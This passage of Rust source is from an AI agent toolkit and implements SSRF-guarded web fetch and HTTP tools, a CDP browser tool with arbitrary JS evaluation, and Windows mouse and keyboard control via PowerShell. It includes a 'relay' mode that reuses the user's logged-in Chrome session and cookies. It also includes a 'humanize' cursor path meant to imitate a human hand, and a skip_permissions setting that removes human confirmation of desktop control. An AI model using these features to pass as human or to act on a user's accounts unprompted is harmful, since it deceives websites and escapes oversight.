    let mut paragraphs: Vec<String> = Vec::new();
    for container in ["article", "main"] {
        if let Some(zone) = tag_zone(&stripped, container) {
            let ps = extract_paragraphs(&zone);
            if ps.len() >= 2 {
                paragraphs = ps;
                break;
            }
        }
    }
    if paragraphs.is_empty() {
        paragraphs = extract_paragraphs(&stripped);
    }

    let mut out = String::new();
    if !title.is_empty() {
        out.push_str(&format!("标题: {title}\n"));
    }
    if !description.is_empty() {
        out.push_str(&format!("描述: {description}\n"));
    }
    for p in paragraphs {
        out.push_str(&format!("\n{p}"));
    }
    out.chars().take(max_chars).collect()
}

fn web_fetch_tool(ssrf: Arc<SsrfGuard>) -> Box<dyn ToolExecutor> {
    boxed(
        "web_fetch",
        "抓取网页/接口文本（经 SSRF 防护，禁止内网/元数据地址；HTML 自动提取正文 readability 风格）。参数: url, max_chars(可选, 默认8000)",
        json!({"type":"object","properties":{"url":{"type":"string"},"max_chars":{"type":"number"}}}),
        Arc::new(move |args| {
            let ssrf = ssrf.clone();
            Box::pin(async move {
                let url = args.get("url").ok_or_else(|| anyhow!("missing 'url'"))?;
                if let Err(e) = ssrf.check(url) {
                    return err(format!("ssrf guard: {}", e), "SSRF_BLOCKED");
                }
                let max: usize = args.get("max_chars").and_then(|m| m.parse().ok()).unwrap_or(8000);
                let resp = match reqwest::Client::new().get(url).send().await {
                    Ok(r) => r,
                    Err(e) => return err(format!("request failed: {}", e), "NET_ERROR"),
                };
                if !resp.status().is_success() {
                    return err(format!("http status {}", resp.status()), "HTTP_ERROR");
                }
                let text = match resp.text().await {
                    Ok(t) => t,
                    Err(e) => return err(format!("read body: {}", e), "READ_ERROR"),
                };
                // HTML 走 readability 正文提取；纯文本/JSON 原样截断
                let body = if looks_like_html(&text) {
                    extract_readable(&text, max)
                } else {
                    text.chars().take(max).collect()
                };
                ok(body)
            })
        }),
    )
}

fn http_request_tool(ssrf: Arc<SsrfGuard>) -> Box<dyn ToolExecutor> {
    boxed(
        "http_request",
        "发起通用 HTTP 请求（GET/POST/...，经 SSRF 防护）。参数: method, url, body(可选), max_chars(可选)",
        json!({"type":"object","properties":{"method":{"type":"string"},"url":{"type":"string"},"body":{"type":"string"},"max_chars":{"type":"number"}}}),
        Arc::new(move |args| {
            let ssrf = ssrf.clone();
            Box::pin(async move {
                let method = args.get("method").map(|s| s.to_uppercase()).unwrap_or_else(|| "GET".into());
                let url = args.get("url").ok_or_else(|| anyhow!("missing 'url'"))?;
                if let Err(e) = ssrf.check(url) {
                    return err(format!("ssrf guard: {}", e), "SSRF_BLOCKED");
                }
                let client = reqwest::Client::new();
                let mut req = client.request(
                    reqwest::Method::from_bytes(method.as_bytes()).map_err(|_| anyhow!("bad method"))?,
                    url,
                );
                if let Some(body) = args.get("body") {
                    req = req.header("Content-Type", "application/json").body(body.clone());
                }
                let resp = match req.send().await {
                    Ok(r) => r,
                    Err(e) => return err(format!("request failed: {}", e), "NET_ERROR"),
                };
                let max: usize = args.get("max_chars").and_then(|m| m.parse().ok()).unwrap_or(8000);
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let truncated: String = text.chars().take(max).collect();
                ok(format!("[status {}]\n{}", status, truncated))
            })
        }),
    )
}

// ── 浏览器自动化（真实 Chromium，CDP，Agent 可控有状态会话）──
//
// 对齐 GUI_Agent/gwwc 的 browser_act 思路，落地 Marguerite 融合路由的
// 「内置 Agent 可控浏览器」：视觉（screenshot 截图）与非视觉（DOM 读取 +
// evaluate/click/type/scroll 操控）双通道。
// - `browser_id`：复用同一页面会话（跨工具调用持续操控）；不传则每次新建。
// - 会话注册表进程内常驻，空闲 10 分钟自动回收，上限 8 个。
// - 无 Chrome 时返回明确错误而非静默失败。

/// 有状态浏览器会话（进程内常驻，drop 时杀 Chromium）
struct BrowserEntry {
    page: PageSession,
    touched: std::time::Instant,
}

const BROWSER_SESSION_TTL: Duration = Duration::from_secs(600);
const BROWSER_SESSION_MAX: usize = 8;

fn browser_sessions() -> &'static tokio::sync::Mutex<HashMap<String, BrowserEntry>> {
    use std::sync::OnceLock;
    static SESSIONS: OnceLock<tokio::sync::Mutex<HashMap<String, BrowserEntry>>> = OnceLock::new();
    SESSIONS.get_or_init(|| tokio::sync::Mutex::new(HashMap::new()))
}

/// 回收空闲超时会话并裁剪到上限（保留最近活跃者）
fn purge_stale(sessions: &mut HashMap<String, BrowserEntry>) {
    let now = std::time::Instant::now();
    sessions.retain(|_, e| now.duration_since(e.touched) < BROWSER_SESSION_TTL);
    while sessions.len() > BROWSER_SESSION_MAX {
        let oldest = sessions
            .iter()
            .min_by_key(|(_, e)| e.touched)
            .map(|(k, _)| k.clone());
        if let Some(k) = oldest {
            sessions.remove(&k);
        } else {
            break;
        }
    }
}

/// 打开一个新页面会话（导航到 url 并启用 Page/Runtime 域）
async fn open_page(bridge: &BrowserBridge, url: &str) -> Result<PageSession> {
    let mut page = bridge.open(url).await?;
    tokio::time::sleep(Duration::from_millis(1200)).await;
    let _ = &mut page;
    Ok(page)
}

/// 打开页面会话：relay 连接用户真实 Chrome（复用登录态），其余走 headless 启动
async fn open_page_for(
    bridge: &BrowserBridge,
    action: &str,
    port: u16,
    url: &str,
) -> Result<PageSession> {
    if action == "relay" {
        let target = if url.trim().is_empty() {
            "about:blank"
        } else {
            url
        };
        let page = bridge.relay(port, target).await?;
        tokio::time::sleep(Duration::from_millis(1200)).await;
        Ok(page)
    } else {
        open_page(bridge, url).await
    }
}

/// 把字符串安全嵌入 JS（JSON 字符串字面量）
fn js_string(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| "\"\"".to_string())
}

/// 在已就绪的页面上执行一次动作
async fn run_browser_action(
    page: &mut PageSession,
    args: &HashMap<String, String>,
    action: &str,
    url: &str,
    fresh: bool,
    workspace: &Path,
    vision_cap: &Option<Arc<VisionCapability>>,
) -> Result<ToolResult> {
    // 复用会话且给了新 url → 先导航到目标页
    if !fresh
        && !url.trim().is_empty()
        && !matches!(action, "close" | "wait")
        && page.session.navigate(url).await.is_ok()
    {
        tokio::time::sleep(Duration::from_millis(800)).await;
    }
    let max_chars: usize = args
        .get("max_chars")
        .and_then(|m| m.parse().ok())
        .unwrap_or(4000);
    match action {
        // B5：relay 连接用户真实 Chrome（复用登录态），返回会话摘要
        "relay" => {
            let title = page
                .session
                .evaluate("document.title", false)
                .await
                .unwrap_or_default();
            let loc = page
                .session
                .evaluate("location.href", false)
                .await
                .unwrap_or_default();
            let cookies = page
                .session
                .evaluate(
                    "document.cookie ? document.cookie.split(';').filter(function(s){return s.trim();}).length : 0",
                    false,
                )
                .await
                .unwrap_or_default();
            let storage = page
                .session
                .evaluate("Object.keys(localStorage).length", false)
                .await
                .unwrap_or_default();
            ok(format!(
                "真实 Chrome 会话已连接（复用登录态）\n标题: {title}\n地址: {loc}\nCookies: {cookies} 条\nlocalStorage: {storage} 项"
            ))
        }
        "open" | "text" => {
            let title = page
                .session
                .evaluate("document.title", false)
                .await
                .unwrap_or_else(|_| "<读取失败>".into());
            let body = page
                .session
                .evaluate("document.body ? document.body.innerText : ''", false)
                .await
                .unwrap_or_default();
            let body: String = body.chars().take(max_chars).collect();
            if action == "text" {
                ok(body)
            } else {
                ok(format!("标题: {title}\n\n{body}"))
            }
        }
        "links" => {
            let max: usize = args.get("max").and_then(|m| m.parse().ok()).unwrap_or(30);
            let js = format!(
                "Array.from(document.querySelectorAll('a')).map(a=>a.innerText.trim()+' => '+a.href).filter(s=>s.length>0).slice(0,{max}).join('\\n')"
            );
            let out = page.session.evaluate(&js, true).await.unwrap_or_default();
            let out: String = out.chars().take(max_chars).collect();
            if out.trim().is_empty() {
                ok("页面无可用链接".into())
            } else {
                ok(out)
            }
        }
        "html" => {
            let js = "document.documentElement ? document.documentElement.outerHTML : ''".to_string();
            let out = page.session.evaluate(&js, true).await.unwrap_or_default();
            let out: String = out.chars().take(max_chars).collect();
            ok(out)
        }
        "evaluate" => {
            let js = args.get("js").cloned().unwrap_or_default();
            if js.trim().is_empty() {
                return err("evaluate 需要非空 js".into(), "INVALID_PARAMS");
            }
            match page.session.evaluate(&js, true).await {
                Ok(v) => {
                    let v: String = v.chars().take(max_chars).collect();
                    ok(v)
                }
                Err(e) => err(format!("evaluate 失败: {e}"), "BROWSER_ERROR"),
            }
        }
        "click" => {
            let selector = args.get("selector").cloned().unwrap_or_default();
            if selector.trim().is_empty() {
                return err("click 需要非空 selector".into(), "INVALID_PARAMS");
            }
            let js = format!(
                "(function(){{var el=document.querySelector({sel});if(!el)return 'ELEMENT_NOT_FOUND';el.click();return 'clicked: '+el.tagName;}})()",
                sel = js_string(&selector)
            );
            match page.session.evaluate(&js, true).await {
                Ok(v) => ok(v),
                Err(e) => err(format!("click 失败: {e}"), "BROWSER_ERROR"),
            }
        }
        "type" => {
            let selector = args.get("selector").cloned().unwrap_or_default();
            let text = args.get("text").cloned().unwrap_or_default();
            if selector.trim().is_empty() || text.trim().is_empty() {
                return err("type 需要非空 selector 与 text".into(), "INVALID_PARAMS");
            }
            let js = format!(
                "(function(){{var el=document.querySelector({sel});if(!el)return 'ELEMENT_NOT_FOUND';el.value={text};el.dispatchEvent(new Event('input',{{bubbles:true}}));el.dispatchEvent(new Event('change',{{bubbles:true}}));return 'typed: '+el.tagName;}})()",
                sel = js_string(&selector),
                text = js_string(&text)
            );
            match page.session.evaluate(&js, true).await {
                Ok(v) => ok(v),
                Err(e) => err(format!("type 失败: {e}"), "BROWSER_ERROR"),
            }
        }
        "scroll" => {
            let px: i64 = args.get("px").and_then(|p| p.parse().ok()).unwrap_or(400);
            let js = format!("window.scrollBy(0,{px}); 'scrolled'");
            match page.session.evaluate(&js, true).await {
                Ok(v) => ok(v),
                Err(e) => err(format!("scroll 失败: {e}"), "BROWSER_ERROR"),
            }
        }
        "screenshot" => {
            let out = args.get("out").cloned().unwrap_or_default();
            if out.trim().is_empty() {
                return err("screenshot 需要非空 out".into(), "INVALID_PARAMS");
            }
            let abs = match safe_resolve(workspace, &out) {
                Ok(p) => p,
                Err(e) => return err(format!("路径解析失败: {e}"), "INVALID_PATH"),
            };
            let png = match page.session.screenshot_png().await {
                Ok(b) => b,
                Err(e) => return err(format!("截图失败: {e}"), "BROWSER_ERROR"),
            };
            if let Err(e) = std::fs::write(&abs, &png) {
                return err(format!("保存截图失败: {e}"), "WRITE_ERROR");
            }
            ok(format!("截图已保存: {} ({} bytes)", abs.display(), png.len()))
        }
        "a11y" => {
            // 非视觉通道·语义快照：Accessibility.getFullAXTree → 可交互节点清单
            let nodes = match page.session.a11y_nodes().await {
                Ok(n) => n,
                Err(e) => return err(format!("a11y 快照失败: {e}"), "BROWSER_ERROR"),
            };
            let mut lines = Vec::new();
            for (i, n) in nodes.iter().enumerate() {
                let (x, y, w, h) = (n.bbox[0], n.bbox[1], n.bbox[2], n.bbox[3]);
                let name = if n.name.is_empty() { "<空>" } else { &n.name };
                lines.push(format!(
                    "[{i}] role={} name={} ref={} bbox=({x:.0},{y:.0},{w:.0}x{h:.0})",
                    n.role, name, n.backend_node_id
                ));
            }
            let mut out = lines.join("\n");
            out = out.chars().take(max_chars).collect();
            ok(format!("可交互节点 {} 个：\n{out}", nodes.len()))
        }
        "click_ref" => {
            // 非视觉通道·语义点击：ref → DOM.getBoxModel 中心 → Input 真实点击
            let ref_id: i64 = match args.get("ref").and_then(|v| v.parse().ok()) {
                Some(v) => v,
                None => return err("click_ref 需要整数 ref（来自 a11y 快照）".into(), "INVALID_PARAMS"),
            };
            let (cx, cy) = match page.session.box_center(ref_id).await {
                Ok(c) => c,
                Err(e) => return err(format!("定位元素失败: {e}"), "BROWSER_ERROR"),
            };
            if let Err(e) = page.session.click_at(cx, cy).await {
                return err(format!("点击失败: {e}"), "BROWSER_ERROR");
            }
            ok(format!("已点击 ref={ref_id} @ ({cx:.0},{cy:.0})"))
        }
        "vision" => {
            // 视觉通道·观察：截图 → 视觉模型描述（无能力时优雅降级）
            let cap = match vision_cap {
                Some(c) => c.clone(),
                None => {
                    return err("未注入视觉能力（VisionCapability），无法执行 vision".into(), "NOT_AVAILABLE")
                }
            };
            let png = match page.session.screenshot_png().await {
                Ok(b) => b,
                Err(e) => return err(format!("截图失败: {e}"), "BROWSER_ERROR"),
            };
            let hint = args.get("hint").cloned().unwrap_or_default();
            let desc = cap.describe_image(&png, &hint).await;
            ok(desc)
        }
        "vision_click" => {
            // 视觉通道·操控：截图 → VLM 坐标定位（截图像素）→ 映射视口 CSS → Input 真实点击
            let cap = match vision_cap {
                Some(c) => c.clone(),
                None => {
                    return err("未注入视觉能力（VisionCapability），无法执行 vision_click".into(), "NOT_AVAILABLE")
                }
            };
            let hint = args.get("hint").cloned().unwrap_or_default();
            if hint.trim().is_empty() {
                return err("vision_click 需要 hint（目标元素描述，如「右上角的搜索按钮」）".into(), "INVALID_PARAMS");
            }
            let png = match page.session.screenshot_png().await {
                Ok(b) => b,
                Err(e) => return err(format!("截图失败: {e}"), "BROWSER_ERROR"),
            };
            let loc = match cap.locate(&png, &hint).await {
                Some(l) => l,
                None => {
                    return err(
                        "视觉定位失败（无视觉模型 / transport 不支持 / 模型未返回坐标 JSON）".into(),
                        "VISION_LOCATE_ERROR",
                    )
                }
            };
            if loc.confidence < 0.2 {
                return err(
                    format!("视觉定位置信度过低（{:.2}），拒绝点击", loc.confidence),
                    "VISION_LOCATE_ERROR",
                );
            }
            // 截图像素 → 视口 CSS 像素（DPR/缩放适配）
            let (v_w, v_h) = match page.session.viewport_size().await {
                Ok(s) => s,
                Err(e) => return err(format!("读取视口失败: {e}"), "BROWSER_ERROR"),
            };
            let meta = image_metadata(&png);
            let png_w = meta.width.unwrap_or(v_w as u32) as f64;
            let png_h = meta.height.unwrap_or(v_h as u32) as f64;
            let x_css = loc.x * v_w / png_w;
            let y_css = loc.y * v_h / png_h;
            if let Err(e) = page.session.click_at(x_css, y_css).await {
                return err(format!("点击失败: {e}"), "BROWSER_ERROR");
            }
            ok(format!(
                "已按视觉定位点击 @ 截图({:.0},{:.0}) → 视口({:.0},{:.0})，置信度 {:.2}",
                loc.x, loc.y, x_css, y_css, loc.confidence
            ))
        }
        other => err(
            format!("未知 action: {other}（支持 open/text/links/html/evaluate/click/type/screenshot/a11y/click_ref/vision/vision_click/wait/scroll/close）"),
            "INVALID_PARAMS",
        ),
    }
}

fn browser_tool(
    workspace: PathBuf,
    vision_cap: Option<Arc<VisionCapability>>,
) -> Box<dyn ToolExecutor> {
    boxed(
        "browser",
        "浏览器自动化（真实 Chromium，CDP）：Agent 可控有状态会话。双通道操控——视觉= screenshot（截图观察）/ vision（截图→视觉模型描述）/ vision_click（截图→VLM 定位坐标→真实点击）；非视觉= open/text/links/html（DOM 读取）+ a11y（无障碍语义快照：role/name/ref）+ click_ref（按 ref 语义点击）/ evaluate/click/type/scroll（DOM 操控）。relay=连接用户真实 Chrome（--remote-debugging-port，复用登录态/cookies）。参数: action(必填), url, js, selector, text, ref(a11y ref), hint(视觉定位目标描述), browser_id(复用会话), out(截图路径), max_chars, max(链接数), wait_ms, px, port(relay 调试端口,默认9222)。不传 browser_id 时每次新建会话。",
        json!({"type":"object","properties":{
            "action":{"type":"string","enum":["open","text","links","html","evaluate","click","type","screenshot","a11y","click_ref","vision","vision_click","wait","scroll","close","relay"]},
            "url":{"type":"string"},
            "js":{"type":"string"},
            "selector":{"type":"string"},
            "text":{"type":"string"},
            "ref":{"type":"number","description":"a11y 快照中的节点 ref（backendDOMNodeId），click_ref 必填"},
            "hint":{"type":"string","description":"vision_click 的目标元素描述（如「右上角搜索按钮」）"},
            "browser_id":{"type":"string","description":"复用已有会话；不传则每次新建"},
            "out":{"type":"string","description":"截图输出相对路径（screenshot 必填）"},
            "max_chars":{"type":"number"},
            "max":{"type":"number","description":"links 最多收集条数"},
            "wait_ms":{"type":"number","description":"wait 动作等待毫秒数"},
            "px":{"type":"number","description":"scroll 动作滚动像素"},
            "port":{"type":"number","description":"relay 动作连接真实 Chrome 的远程调试端口，默认 9222"}
        },"required":["action"]}),
        Arc::new(move |args| {
            let workspace = workspace.clone();
            let vision_cap = vision_cap.clone();
            Box::pin(async move {
                let action = args.get("action").cloned().unwrap_or_default();
                if action.trim().is_empty() {
                    return err("browser 需要非空 action".into(), "INVALID_PARAMS");
                }
                let browser_id = args
                    .get("browser_id")
                    .cloned()
                    .filter(|s| !s.trim().is_empty());
                let url = args.get("url").cloned().unwrap_or_default();
                let port: u16 = args.get("port").and_then(|p| p.parse().ok()).unwrap_or(9222);

                // wait / close 不依赖 Chromium 会话
                if action == "wait" {
                    let ms: u64 = args.get("wait_ms").and_then(|v| v.parse().ok()).unwrap_or(1000);
                    tokio::time::sleep(Duration::from_millis(ms)).await;
                    return ok(format!("已等待 {ms}ms"));
                }
                if action == "close" {
                    if let Some(bid) = &browser_id {
                        browser_sessions().lock().await.remove(bid);
                    }
                    return ok("浏览器会话已关闭".into());
                }

                // 需要页面的动作：一次性会话必须有 url（复用会话可不传）
                let needs_page = matches!(
                    action.as_str(),
                    "open" | "text" | "links" | "html" | "evaluate" | "click" | "type"
                        | "screenshot" | "a11y" | "click_ref" | "vision" | "vision_click"
                        | "scroll"
                );
                if needs_page && url.trim().is_empty() && browser_id.is_none() {
                    return err("browser 需要非空 url（复用会话时可只传 browser_id）".into(), "INVALID_PARAMS");
                }

                let bridge = BrowserBridge::new();
                if !bridge.is_available() {
                    return err(
                        "未检测到 Chromium/Chrome 可执行文件（browser_bridge 不可用）".into(),
                        "NOT_AVAILABLE",
                    );
                }

                let mut guard = browser_sessions().lock().await;
                purge_stale(&mut guard);

                // 复用既有会话；否则新建（有 browser_id 则登记，无则一次性）
                if let Some(bid) = &browser_id {
                    if let Some(entry) = guard.get_mut(bid) {
                        entry.touched = std::time::Instant::now();
                        return run_browser_action(
                            &mut entry.page,
                            args,
                            &action,
                            &url,
                            false,
                            &workspace,
                            &vision_cap,
                        )
                        .await;
                    }
                    // 新建会话并登记到注册表（Agent 后续可跨调用持续操控）
                    let mut page = match open_page_for(&bridge, &action, port, &url).await {
                        Ok(p) => p,
                        Err(e) => return err(format!("打开页面失败: {e}"), "BROWSER_ERROR"),
                    };
                    let result = run_browser_action(&mut page, args, &action, &url, true, &workspace, &vision_cap).await;
                    guard.insert(bid.clone(), BrowserEntry {
                        page,
                        touched: std::time::Instant::now(),
                    });
                    result
                } else {
                    // 一次性会话：用完即弃（保持旧语义）
                    let mut page = match open_page_for(&bridge, &action, port, &url).await {
                        Ok(p) => p,
                        Err(e) => return err(format!("打开页面失败: {e}"), "BROWSER_ERROR"),
                    };
                    run_browser_action(&mut page, args, &action, &url, true, &workspace, &vision_cap).await
                }
            })
        }),
    )
}

// ── 系统级鼠标键盘控制（第三方软硬件/系统级输入，Windows user32）──
//
// Marguerite 融合路由中 Bloom 模式的系统控制通道：真实移动系统光标、点击/滚轮、
// 发送键盘按键与文本，供 Agent 操控任意桌面应用（不限于内置浏览器）。
// 实现走 PowerShell + user32 P/Invoke（SendInput 语义），零新增 Rust 依赖。
// 该能力在模式门控中属 Desktop 类（Bloom 默认人工确认，skip_permissions 全开自动）。

/// user32 P/Invoke 前缀（C# 内联，经 PowerShell Add-Type 编译）
const SYS_CTRL_PREAMBLE: &str = r#"
$ErrorActionPreference='Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class MgtSC {
  [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
  [DllImport("user32.dll")] public static extern void mouse_event(uint flags, uint dx, uint dy, uint data, UIntPtr extra);
  [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT lp);
  [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
  [StructLayout(LayoutKind.Sequential)] public struct POINT { public int X; public int Y; }
}
"@
"#;

/// 构造单个动作的 PowerShell 语句（动作 → user32/SendKeys 调用）
fn system_control_ps(action: &str, args: &HashMap<String, String>) -> Result<String> {
    let stmt = match action {
        "mouse_move" => {
            let x: i32 = args
                .get("x")
                .and_then(|v| v.parse().ok())
                .ok_or_else(|| anyhow!("mouse_move 需要整数 x"))?;
            let y: i32 = args
                .get("y")
                .and_then(|v| v.parse().ok())
                .ok_or_else(|| anyhow!("mouse_move 需要整数 y"))?;
            // 拟人化移动（默认开启，humanize:0 回退直线跳转）：贝塞尔三次曲线
            // 路径 + 随机控制点 + 18 步插值 + 随机步进延迟，模仿人手轨迹。
            // 终点精确等于 (x,y)，不影响落点精度。
            let humanize: bool = args
                .get("humanize")
                .map(|v| v != "0" && !v.eq_ignore_ascii_case("false"))
                .unwrap_or(true);
            if !humanize {
                format!("[MgtSC]::SetCursorPos({x},{y})")
            } else {
                format!(
                    "$p=New-Object MgtSC+POINT;[MgtSC]::GetCursorPos([ref]$p)|Out-Null;\
$sx=$p.X;$sy=$p.Y;$dx={x};$dy={y};\
$cx1=$sx+($dx-$sx)*0.3+(Get-Random -Minimum -40 -Maximum 40);\
$cy1=$sy+($dy-$sy)*0.2+(Get-Random -Minimum -40 -Maximum 40);\
$cx2=$sx+($dx-$sx)*0.7+(Get-Random -Minimum -40 -Maximum 40);\
$cy2=$sy+($dy-$sy)*0.8+(Get-Random -Minimum -40 -Maximum 40);\
$steps=18;\
for($i=1;$i -le $steps;$i++){{$t=$i/$steps;$mt=1-$t;\
$px=[int]($mt*$mt*$mt*$sx+3*$mt*$mt*$t*$cx1+3*$mt*$t*$t*$cx2+$t*$t*$t*$dx);\
$py=[int]($mt*$mt*$mt*$sy+3*$mt*$mt*$t*$cy1+3*$mt*$t*$t*$cy2+$t*$t*$t*$dy);\
[MgtSC]::SetCursorPos($px,$py)|Out-Null;Start-Sleep -Milliseconds (Get-Random -Minimum 4 -Maximum 14)}};\
[MgtSC]::SetCursorPos({x},{y})|Out-Null"
                )
            }
        }
        "mouse_click" => {
            let x: Option<i32> = args.get("x").and_then(|v| v.parse().ok());
            let y: Option<i32> = args.get("y").and_then(|v| v.parse().ok());
            let button = args.get("button").map(String::as_str).unwrap_or("left");
            // "1"/"true" → 双击（bool::from_str 只认 true/false，故手动归一）
            let double: bool = args
                .get("double")
                .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
                .unwrap_or(false);
            let (down, up): (u32, u32) = match button {
                "right" => (0x08, 0x10),
                "middle" => (0x20, 0x40),
                _ => (0x02, 0x04), // left
            };
            let mut s = String::new();
            if let (Some(x), Some(y)) = (x, y) {
                s.push_str(&format!("[MgtSC]::SetCursorPos({x},{y});"));
            }
            let clicks = if double { 2 } else { 1 };
            for _ in 0..clicks {
                s.push_str(&format!(
                    "[MgtSC]::mouse_event(0x{down:X},0,0,0,[UIntPtr]::Zero);[MgtSC]::mouse_event(0x{up:X},0,0,0,[UIntPtr]::Zero);"
                ));
            }
            s
        }
        "mouse_scroll" => {
            let lines: i32 = args
                .get("lines")
                .and_then(|v| v.parse().ok())
                .ok_or_else(|| anyhow!("mouse_scroll 需要整数 lines"))?;
            let mut s = String::new();
            if let (Some(x), Some(y)) = (
                args.get("x").and_then(|v| v.parse::<i32>().ok()),
                args.get("y").and_then(|v| v.parse::<i32>().ok()),
            ) {
                s.push_str(&format!("[MgtSC]::SetCursorPos({x},{y});"));
            }
            let delta = (lines * 120) as u32; // 上正下负（补码）
            s.push_str(&format!("[MgtSC]::mouse_event(0x0800,0,0,{delta},[UIntPtr]::Zero)"));
            s
        }
        "mouse_pos" => {
            "$p=New-Object MgtSC+POINT;[MgtSC]::GetCursorPos([ref]$p)|Out-Null;\"x=$($p.X) y=$($p.Y)\""
                .to_string()
        }
        "screen_size" => {
            "\"width=\"+[MgtSC]::GetSystemMetrics(0)+\" height=\"+[MgtSC]::GetSystemMetrics(1)"
                .to_string()
        }
        "key_press" => {
            let key = args.get("key").cloned().unwrap_or_default();
            if key.trim().is_empty() {
                return Err(anyhow!("key_press 需要非空 key"));
            }
            let sk = sendkeys_for(&key).ok_or_else(|| anyhow!("不支持的按键: {key}"))?;
            format!("[System.Windows.Forms.SendKeys]::SendWait('{sk}')")
        }
        "type_text" => {
            // 经环境变量传文本（规避 PS 引号转义），剪贴板粘贴实现任意 Unicode
            "Add-Type -AssemblyName System.Windows.Forms;$t=$env:MARG_SYS_TEXT;if($null -eq $t){$t=''};[System.Windows.Forms.Clipboard]::SetText($t);[System.Windows.Forms.SendKeys]::SendWait('^v')"
                .to_string()
        }
        // 多屏坐标枚举：列出全部显示器在虚拟桌面坐标系中的边界（可为负）与主屏标记。
        // 让 Agent 先在多屏上定位，再据此给出 mouse_move/mouse_click 的绝对坐标。
        "monitors" => {
            r#"Add-Type -AssemblyName System.Windows.Forms
$i=0
foreach($s in [System.Windows.Forms.Screen]::AllScreens){
  "monitor$i x=$($s.Bounds.X) y=$($s.Bounds.Y) w=$($s.Bounds.Width) h=$($s.Bounds.Height) primary=$($s.Primary)"
  $i++
}"#
            .to_string()
        }
        // 截图 + 可选 OCR：.NET System.Drawing 截取屏幕（指定显示器/区域/全虚拟屏）存 PNG，
        // ocr=1 时用 Windows.Media.Ocr（WinRT，零新增依赖）识别文本并附带每行包围盒坐标。
        "screenshot" => {
            let out = args.get("out").cloned().unwrap_or_default();
            if out.trim().is_empty() {
                return Err(anyhow!("screenshot 需要非空 out（截图输出路径）"));
            }
            let monitor: i32 = args.get("monitor").and_then(|v| v.parse().ok()).unwrap_or(-1);
            let opt = |k: &str| -> String {
                args.get(k)
                    .and_then(|v| v.parse::<i32>().ok())
                    .map(|n| n.to_string())
                    .unwrap_or_else(|| "$null".into())
            };
            let ocr: bool = args
                .get("ocr")
                .map(|v| v == "1" || v.eq_ignore_ascii_case("true"))
                .unwrap_or(false);
            let ocr_block = if ocr {
                r#"
if($ocr){
  Add-Type -AssemblyName System.Runtime.WindowsRuntime
  $null=[Windows.Media.Ocr.OcrEngine, Windows.Foundation, ContentType=WindowsRuntime]
  $null=[Windows.Graphics.Imaging.BitmapDecoder, Windows.Foundation, ContentType=WindowsRuntime]
  $null=[Windows.Storage.StorageFile, Windows.Foundation, ContentType=WindowsRuntime]
  $asTaskGeneric=([System.WindowsRuntimeSystemExtensions].GetMethods()|Where-Object{$_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'})[0]
  function Await($t,$rt){$m=$asTaskGeneric.MakeGenericMethod($rt);$nt=$m.Invoke($null,@($t));$nt.Wait(-1)|Out-Null;$nt.Result}
  try{
    $file=Await ([Windows.Storage.StorageFile]::GetFileFromPathAsync($out)) ([Windows.Storage.StorageFile])
    $stream=Await ($file.OpenAsync([Windows.Storage.FileAccessMode]::Read)) ([Windows.Storage.Streams.IRandomAccessStream])
    $decoder=Await ([Windows.Graphics.Imaging.BitmapDecoder]::CreateAsync($stream)) ([Windows.Graphics.Imaging.BitmapDecoder])
    $bitmap=Await ($decoder.GetSoftwareBitmapAsync()) ([Windows.Graphics.Imaging.SoftwareBitmap])
    $engine=[Windows.Media.Ocr.OcrEngine]::TryCreateFromUserProfileLanguages()
    if($null -eq $engine){"OCR 引擎不可用（Windows 10+ 需安装 OCR 语言包）"}
    else{
      $result=Await ($engine.RecognizeAsync($bitmap)) ([Windows.Media.Ocr.OcrResult])
      $lines=@($result.Lines)
      "OCR 识别 $($lines.Count) 行："
      foreach($lineObj in $lines){
        $words=@($lineObj.Words)
        if($words.Count -gt 0){
          $w0=$words[0].BoundingRect
          "  [$([int]$w0.X),$([int]$w0.Y),$([int]$w0.Width),$([int]$w0.Height)] $($lineObj.Text)"
        } else { "  [?] $($lineObj.Text)" }
      }
    }
  } catch { "OCR 失败: $($_.Exception.Message)" }
}"#
                .to_string()
            } else {
                String::new()
            };
            format!(
                r#"Add-Type -AssemblyName System.Drawing,System.Windows.Forms
$out=$env:MARG_SYS_OUT
if(-not ([IO.Path]::IsPathRooted($out))){{$out=Join-Path (Get-Location) $out}}
$monitor={monitor};$rx={rx};$ry={ry};$rw={rw};$rh={rh};$ocr={ocr_bool}
$screens=[System.Windows.Forms.Screen]::AllScreens
$b=$null
if($monitor -ge 0 -and $monitor -lt $screens.Count){{$b=$screens[$monitor].Bounds}}
if($null -eq $b -and $rx -ne $null -and $ry -ne $null -and $rw -ne $null -and $rh -ne $null){{$b=New-Object System.Drawing.Rectangle($rx,$ry,$rw,$rh)}}
if($null -eq $b){{$b=[System.Windows.Forms.SystemInformation]::VirtualScreen}}
if($b.Width -le 0 -or $b.Height -le 0){{throw "无效截图区域"}}
$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height)
$g=[System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.X,$b.Y,0,0,$bmp.Size)
$g.Dispose()
$dir=Split-Path -Parent $out
if($dir -and -not (Test-Path $dir)){{New-Item -ItemType Directory -Force -Path $dir|Out-Null}}
$bmp.Save($out,[System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()
"已保存截图: $out [$($b.Width)x$($b.Height) @ ($($b.X),$($b.Y))]"
{ocr_block}"#,
                monitor = monitor,
                rx = opt("x"),
                ry = opt("y"),
                rw = opt("width"),
                rh = opt("height"),
                ocr_bool = if ocr { "$true" } else { "$false" },
                ocr_block = ocr_block,
            )
        }
        other => {
            return Err(anyhow!(
                "未知 action: {other}（支持 mouse_move/mouse_click/mouse_scroll/mouse_pos/screen_size/monitors/screenshot/key_press/type_text）"
            ))
        }
    };
    Ok(format!("{SYS_CTRL_PREAMBLE}\n{stmt}"))
}

/// 把按键/组合键映射为 SendKeys 语法（`^` Ctrl、`%` Alt、`+` Shift、`{}` 命名键）
fn sendkeys_for(key: &str) -> Option<String> {
    let lower = key.to_lowercase();
